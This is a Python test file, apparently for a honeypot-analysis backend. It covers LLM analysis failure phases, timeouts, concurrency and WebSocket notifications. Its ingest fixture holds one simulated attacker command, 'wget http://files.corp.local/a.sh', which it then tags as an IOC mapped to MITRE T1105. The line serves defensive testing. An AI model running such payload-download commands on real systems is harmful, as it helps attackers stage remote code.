"""Execution and transactional notification checks on an explicitly isolated database."""

import asyncio
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone
import json
import os
import subprocess
import sys
from threading import Event
from time import monotonic
import unittest
from unittest.mock import patch
from uuid import uuid4

from anyio import fail_after
from fastapi import WebSocketDisconnect
import httpx
from sqlalchemy import func, select

from backend.api import app
from backend.analysis_execution import post_provider
from backend.realtime import PROTOCOL, notify_change
from backend.routes import AnalysisResult, Finding, IocProposal, MitreProposal
from test_auth import AuthFixture


class ProviderDeadlineTests(unittest.TestCase):
    def test_http_wall_deadline_cancels_a_slow_body(self):
        class SlowBody(httpx.AsyncByteStream):
            async def __aiter__(self):
                for _ in range(20):
                    await asyncio.sleep(0.01)
                    yield b"."

        transport = httpx.MockTransport(lambda _: httpx.Response(200, stream=SlowBody()))
        client = httpx.AsyncClient
        with patch("backend.analysis_execution.httpx.AsyncClient",
                   side_effect=lambda **kwargs: client(transport=transport, **kwargs)):
            started = monotonic()
            with self.assertRaises(httpx.ReadTimeout):
                post_provider("https://fixture.invalid", headers={}, json={}, timeout=0.05)
            self.assertLess(monotonic() - started, 0.18)


@unittest.skipUnless(os.getenv("TACTICLENS_ISOLATED_H070806") == "1", "PostgreSQL aislado requerido")
class ExecutionRealtimeTests(AuthFixture):
    @classmethod
    def setUpClass(cls):
        if (os.getenv("DATABASE_HOST"), os.getenv("DATABASE_PORT"), os.getenv("DATABASE_NAME")) != (
                "127.0.0.1", "56587", "tacticlens_h02_h05_h070806"):
            raise RuntimeError("Se requiere el PostgreSQL desechable de H06–H08.")
        super().setUpClass()

    def commit_fixture(self):
        self.outer.commit()
        self.outer = self.connection.begin()
        app.state.engine = self.engine

    def ingest(self, session=None):
        session = session or uuid4().hex
        raw = {"eventid": "cowrie.command.input", "session": session,
               "timestamp": datetime.now(timezone.utc).isoformat(), "src_ip": "198.51.100.10",
               "input": "wget http://files.corp.local/a.sh", "_collector": {"source_id": uuid4().hex}}
        response = self.client.post("/api/ingesta/eventos", json={"eventos": [raw]},
                                    headers={"X-API-Key": os.environ["INGEST_API_KEY"]})
        self.assertEqual(response.status_code, 200, response.text)
        event_id = response.json()["confirmaciones"][0]["id_evento"]
        table = app.state.tables["evento"]
        with app.state.engine.connect() as conn:
            sid = conn.scalar(select(table.c.id_sesion).where(table.c.id_evento == event_id))
        return session, sid, event_id

    @staticmethod
    def result(event_id=None):
        if event_id is None:
            return AnalysisResult(resumen="Resultado sintético", acciones=[])
        return AnalysisResult(resumen="Descarga intentada", acciones=[Finding(
            tipo="comando", descripcion="Orden de descarga observada", confianza=0.8, eventos=[event_id],
            iocs=[IocProposal(tipo="URL", valor="http://files.corp.local/a.sh", evento=event_id)],
            mitre=[MitreProposal(codigo="T1105", codigo_tactica="TA0011", eventos=[event_id],
                comportamiento_observado="Orden de descarga",
                justificacion="Orden de descarga registrada con URL", confianza=0.7,
                limitaciones=["No confirma la descarga."])]
        )])

    def test_safe_failure_phases_retry_and_last_success(self):
        self.enroll(100000 + int(uuid4().hex[:4], 16), admin=True)
        name, sid, _ = self.ingest()
        url = f"/api/sesiones/{sid}/analizar"
        with patch.dict(os.environ, {"LLM_API_KEY": ""}), patch("backend.routes.real_result") as provider:
            response = self.client.post(url)
            self.assertEqual(response.status_code, 503, response.text)
            self.assertEqual(response.json()["detail"]["fase"], "configuracion")
            provider.assert_not_called()
        with patch("backend.routes.real_result", return_value=self.result()) as provider:
            first = self.client.post(url)
            self.assertEqual(first.status_code, 200, first.text)
            self.assertTrue(self.client.post(url).json()["reutilizado"])
            provider.assert_called_once()
        previous = first.json()["id_analisis"]
        self.ingest(name)
        invalid = httpx.Response(200, content=b"not-json", request=httpx.Request("POST", "https://fixture.invalid"))
        failures = [
            ("backend.routes.rag_context", RuntimeError("fixture"), "recuperacion_rag", "fallo_recuperacion_rag", 502),
            ("backend.routes.enrich", RuntimeError("fixture"), "enriquecimiento", "fallo_enriquecimiento", 502),
            ("backend.routes.post_provider", httpx.ConnectError("secret-fixture"), "proveedor", "proveedor_no_disponible", 502),
            ("backend.routes.post_provider", httpx.ReadTimeout("secret-fixture"), "proveedor", "timeout_proveedor", 504),
            ("backend.routes.post_provider", invalid, "validacion", "respuesta_invalida", 502),
        ]
        for target, value, phase, code, status in failures:
            with self.subTest(phase=phase, code=code), patch(target,
                    side_effect=value if isinstance(value, Exception) else None, return_value=value):
                failed = self.client.post(url)
                self.assertEqual(failed.status_code, status, failed.text)
                error = failed.json()["detail"]
                self.assertEqual((error["fase"], error["codigo"]), (phase, code))
                self.assertNotIn("secret-fixture", failed.text)
                session = self.client.get(f"/api/sesiones/{sid}").json()
                self.assertEqual(session["ultimo_intento"]["error"], error)
                self.assertEqual(session["analisis"]["id_analisis"], previous)
                self.assertEqual(session["vigencia_analisis"]["cobertura_eventos"], "incompleta")
        def partial(conn, aid, *_args, **_kwargs):
            action = app.state.tables["accion_identificada"]
            conn.execute(action.insert().values(id_analisis=aid, tipo_accion="fixture", descripcion="Parcial"))
            raise RuntimeError("secret-fixture")
        with patch("backend.routes.real_result", return_value=self.result()), patch("backend.routes.persist_findings", side_effect=partial):
            failed = self.client.post(url)
        self.assertEqual(failed.status_code, 502, failed.text)
        self.assertEqual(failed.json()["detail"]["fase"], "persistencia")
        action = app.state.tables["accion_identificada"]
        self.assertEqual(self.connection.scalar(select(func.count()).select_from(action).where(
            action.c.id_analisis == failed.json()["detail"]["id_analisis"])), 0)
        with patch("backend.routes.real_result", return_value=self.result()):
            again = self.client.post(url)
        self.assertEqual(again.status_code, 200, again.text)
        self.assertNotEqual(again.json()["id_analisis"], previous)
        latest = self.client.get(f"/api/sesiones/{sid}").json()
        self.assertEqual(latest["estado_ultimo_intento"], "completado")
        self.assertEqual(latest["vigencia_analisis"]["metodologia"], "vigente")

    def test_parallel_attempt_and_late_result(self):
        self.enroll(100000 + int(uuid4().hex[:4], 16), admin=True)
        self.commit_fixture()
        _, sid, _ = self.ingest()
        url = f"/api/sesiones/{sid}/analizar"
        # Warm isolated embeddings so the deadline measures the held provider.
        from backend.rag.embeddings import encoder
        from backend.routes import rag_context
        encoder()
        original = rag_context
        entered, released, finished = Event(), Event(), Event()
        def provider(*_args, **_kwargs):
            entered.set()
            try:
                released.wait(5)
                return self.result()
            finally:
                finished.set()
        def warm(*args, **kwargs):
            return original(*args, **kwargs)
        with patch.dict(os.environ, {"LLM_ANALYSIS_TIMEOUT_SECONDS": "1.4"}), \
             patch("backend.routes.rag_context", side_effect=warm), \
             patch("backend.routes.real_result", side_effect=provider) as send, ThreadPoolExecutor(2) as executor:
            start = monotonic()
            first = executor.submit(self.client.post, url)
            try:
                self.assertTrue(entered.wait(1.25))
                simultaneous = self.client.post(url)
                self.assertEqual(simultaneous.status_code, 409, simultaneous.text)
                expired = first.result(5)
                self.assertEqual(expired.status_code, 504, expired.text)
                self.assertFalse(finished.is_set())
                old_id = expired.json()["detail"]["id_analisis"]
                self.assertEqual(send.call_count, 1)
                print(f"H07: proveedor tardío contenido en {(monotonic()-start)*1000:.1f} ms, plazo 1400 ms.")
                with patch.dict(os.environ, {"LLM_ANALYSIS_TIMEOUT_SECONDS": "10"}), patch("backend.routes.real_result", return_value=self.result()):
                    second = self.client.post(url)
                self.assertEqual(second.status_code, 200, second.text)
                released.set()
                self.assertTrue(finished.wait(2))
                row = self.client.get(f"/api/analisis/{old_id}").json()
                self.assertEqual(row["estado"], "fallido")
                self.assertEqual(row["resultado_estructurado"]["ejecucion"]["error"]["codigo"], "plazo_agotado")
                detail = self.client.get(f"/api/sesiones/{sid}").json()
                self.assertEqual(detail["analisis"]["id_analisis"], second.json()["id_analisis"])
                self.assertEqual(detail["estado_ultimo_intento"], "completado")
            finally:
                released.set()

    def notice(self, ws, timeout=4):
        async def receive():
            with fail_after(timeout):
                return await ws._send_rx.receive()
        message = ws.portal.call(receive)
        self.assertEqual(message["type"], "websocket.send", message)
        return json.loads(message["text"])

    def sockets(self):
        return self.client.websocket_connect("/api/monitor/ws", subprotocols=[PROTOCOL])

    def test_two_sockets_changes_rollback_scope_and_cross_process(self):
        analyst, *_ = self.enroll(100000 + int(uuid4().hex[:4], 16))
        self.enroll(100000 + int(uuid4().hex[:4], 16), admin=True)
        self.commit_fixture()
        with self.sockets() as first, self.sockets() as second:
            sockets = (first, second)
            for socket in sockets:
                self.assertEqual(self.notice(socket)["tipo"], "listo")
            panel_before = self.client.get("/api/dashboard/resumen").json()
            start = monotonic()
            name, sid, event_id = self.ingest()
            for socket in sockets:
                change = self.notice(socket)
                self.assertEqual(change["dominios"], ["sesiones", "iocs", "panel"])
                self.assertEqual(change["eventos"], [event_id])
                self.assertEqual(set(change), {"tipo", "confirmado_api", "recibido_api", "epoca", "revision",
                                               "eventos", "dominios"})
            print(f"H06: ingesta confirmada a dos clientes en {(monotonic()-start)*1000:.1f} ms.")
            self.assertEqual(self.client.get("/api/dashboard/resumen").json()["eventos"], panel_before["eventos"] + 1)

            run = f"/api/sesiones/{sid}/analizar"
            held = Event()
            claimed = Event()
            def successful(*args, **kwargs):
                claimed.set()
                held.wait(5)
                return self.result(event_id)

            with patch("backend.routes.real_result", side_effect=successful), ThreadPoolExecutor(1) as pool:
                job = pool.submit(self.client.post, run)
                try:
                    self.assertTrue(claimed.wait(4))
                    for socket in sockets:
                        self.assertEqual(self.notice(socket)["dominios"], ["analisis"])
                finally:
                    held.set()
                result = job.result(8)
            self.assertEqual(result.status_code, 200, result.text)
            for socket in sockets:
                self.assertEqual(self.notice(socket)["dominios"], ["analisis","iocs","mitre","salvaguardas","panel"])
            self.assertEqual(self.client.get("/api/dashboard/resumen").json()["sesiones_analizadas"],
                             panel_before["sesiones_analizadas"] + 1)
            analysis = self.client.get("/api/analisis/" + result.json()["id_analisis"]).json()
            mapping = analysis["acciones"][0]["mitre"][0]["id_mapeo"]
            with self.engine.begin() as conn:
                t = app.state.tables
                observation = conn.scalar(select(t["observacion_ioc"].c.id_observacion)
                    .join(t["ioc"], t["ioc"].c.id_ioc == t["observacion_ioc"].c.id_ioc)
                    .where(t["observacion_ioc"].c.id_evento == event_id, t["ioc"].c.valor == "http://files.corp.local/a.sh"))
                task = conn.scalar(t["salvaguarda"].insert().values(id_sesion=sid, huella="0"*64,
                    nombre="Control de prueba", nivel_riesgo="bajo").returning(t["salvaguarda"].c.id_salvaguarda))

            for resource, item, topic in (("observacion_ioc", observation, "iocs"), ("mitre", mapping, "mitre")):
                revision = self.client.patch(f"/api/inteligencia/{resource}/{item}/revision",
                    json={"estado":"confirmado", "motivo":"Evidencia controlada de la prueba","revision_esperada":None})
                self.assertEqual(revision.status_code, 200, revision.text)
                for socket in sockets:
                    self.assertEqual(set(self.notice(socket)["dominios"]), {topic, "analisis", "iocs", "mitre", "panel"})

            for operation, payload in (("asignacion", {"responsable": str(analyst)}),
                                       ("estado", {"estado": "en_desarrollo"})):
                change = self.client.post(f"/api/salvaguardas/{task}/{operation}", json=payload)
                self.assertEqual(change.status_code, 200, change.text)
                for socket in sockets:
                    self.assertEqual(self.notice(socket)["dominios"], ["salvaguardas"])

            self.ingest(name)
            for socket in sockets:
                self.notice(socket)
            held.clear()
            claimed.clear()
            def failed(*args, **kwargs):
                claimed.set()
                held.wait(5)
                raise RuntimeError("fixture")
            with patch("backend.routes.real_result", side_effect=failed), ThreadPoolExecutor(1) as pool:
                job = pool.submit(self.client.post, run)
                try:
                    self.assertTrue(claimed.wait(4))
                    for socket in sockets:
                        self.assertEqual(self.notice(socket)["dominios"], ["analisis"])
                finally:
                    held.set()
                result = job.result(8)
            self.assertEqual(result.status_code, 502, result.text)
            for socket in sockets:
                self.assertEqual(self.notice(socket)["dominios"], ["analisis"])

            with self.engine.connect() as conn:
                transaction = conn.begin()
                notify_change(conn, [app.state.honeypot_id], "panel")
                transaction.rollback()
            with self.engine.begin() as conn:
                notify_change(conn, [uuid4()], "panel")
            for socket in sockets:
                with self.assertRaises(TimeoutError):
                    self.notice(socket, 0.25)

            subprocess.run([sys.executable, "-c",
                "import os; from backend.db import database_engine; from backend.realtime import notify_change; "
                "e=database_engine(); c=e.connect(); notify_change(c,[os.environ['HONEYPOT_ID']],'panel'); c.commit(); c.close()"],
                check=True, timeout=10)
            for socket in sockets:
                self.assertEqual(self.notice(socket)["dominios"], ["panel"])
        with self.sockets() as reconnected:
            self.assertEqual(self.notice(reconnected)["tipo"], "listo")
        self.client.cookies.clear()
        with self.assertRaises(WebSocketDisconnect):
            with self.sockets():
                pass
